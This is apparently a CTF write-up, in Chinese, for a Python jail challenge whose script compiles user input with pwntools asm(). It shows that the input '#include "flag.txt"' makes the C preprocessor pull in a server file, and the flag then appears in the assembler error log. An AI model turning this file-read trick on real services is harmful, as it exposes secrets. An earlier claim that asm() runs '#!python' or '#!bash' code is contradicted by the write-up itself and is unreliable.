---
title: PythonJail_assembly
tags: [pythonjail, CTF]

---

python_jail
:利用題目提供的Python環境本身的漏洞來逃逸（Escape），最終取得一個完整的Shell




```
#!/usr/local/bin/python3
import os
os.environ['PWNLIB_NOTERM'] = '1'
from pwn import asm

try:
    shellcode = asm(input('> '), arch='amd64', os='linux')
except Exception as e:
    print('Could not compile shellcode. Exiting...')
    exit()

print('Compiled shellcode to X86!')
print(shellcode.hex(' '))
```


問題的核心在於題目使用的 pwn.asm() 函數。pwntools 是一個功能極其強大的函式庫，它的 asm() 函數不僅僅能編譯組合語言，還內建了一個類似C語言的前置處理器（Preprocessor）。這個前置處理器允許使用一些特殊的指令，其中一個對於Python Jail挑戰來說是致命的。

漏洞點：pwn.asm 的 #! 指令
pwn.asm() 函數支援一個特殊的 "shebang" 指令 #!。當 asm 函數處理的字串以 #! 開頭時，它會將 #! 後面的字串當作一個直譯器（Interpreter），並用這個直譯器去執行後續的程式碼。
例如，#!bash 會讓它使用bash去執行後面的指令。更重要的是，它也支援 #!python。
這意味著，我們可以構造一個以 #!python 開頭的輸入，pwn.asm 函數在嘗試「編譯」之前，會先用Python直譯器執行我們提供的程式碼。這就給了我們一個逃逸出這個受限環境的絕佳機會。
解決方案




在進行組合語言編譯之前，pwn.asm() 函數首先呼叫了 cpp 這個程式。cpp 是 C Preprocessor（C語言預處理器） 的縮寫。
cpp 不認識 #! 這個指令（因為它不是一個有效的C語言預處理指令，如 #include 或 #define），所以直接報錯了。

我們的輸入會先被當作C語言的原始碼，由 cpp 處理一遍，其處理結果才會被送去給組合語言編譯器。真正的漏洞不在於Python Jail，而在於我們可以濫用C語言預處理器的功能！

#include 指令
C預處理器最著名的功能之一就是 #include 指令，它可以將指定的檔案內容完整地讀取並插入到當前位置。我們可以利用這個功能來讀取伺服器上的任意檔案，包括旗標檔案！


#include "flag.txt"



```
# > #include "flag.txt"
# [ERROR] There was an error running ['/usr/bin/x86_64-linux-gnu-as', '-64', '-o', '/tmp/pwn-asm-iittcc15/step2', '/tmp/pwn-asm-iittcc15/step1']:
#     It had the exitcode 1.
#     It had this on stdout:
#     /tmp/pwn-asm-iittcc15/step1: Assembler messages:
#     /tmp/pwn-asm-iittcc15/step1:8: Error: invalid character '{' in mnemonic

# [ERROR] An error occurred while assembling:
#        1: .section .shellcode,"awx"
#        2: .global _start
#        3: .global __start
#        4: _start:
#        5: __start:
#        6: .intel_syntax noprefix
#        7: .p2align 0
#        8: jail{yeah_just_include_flag.txt_lol}
#     Traceback (most recent call last):
#       File "/usr/local/lib/python3.13/site-packages/pwnlib/asm.py", line 783, in asm
#         _run(assembler + ['-o', step2, step1])
#         ~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#       File "/usr/local/lib/python3.13/site-packages/pwnlib/asm.py", line 434, in _run
#         log.error(msg, *args)
#         ~~~~~~~~~^^^^^^^^^^^^
#       File "/usr/local/lib/python3.13/site-packages/pwnlib/log.py", line 439, in error
#         raise PwnlibException(message % args)
#     pwnlib.exception.PwnlibException: There was an error running ['/usr/bin/x86_64-linux-gnu-as', '-64', '-o', '/tmp/pwn-asm-iittcc15/step2', '/tmp/pwn-asm-iittcc15/step1']:
#     It had the exitcode 1.
#     It had this on stdout:
#     /tmp/pwn-asm-iittcc15/step1: Assembler messages:
#     /tmp/pwn-asm-iittcc15/step1:8: Error: invalid character '{' in mnemonic

# Could not compile shellcode. Exiting... 
```



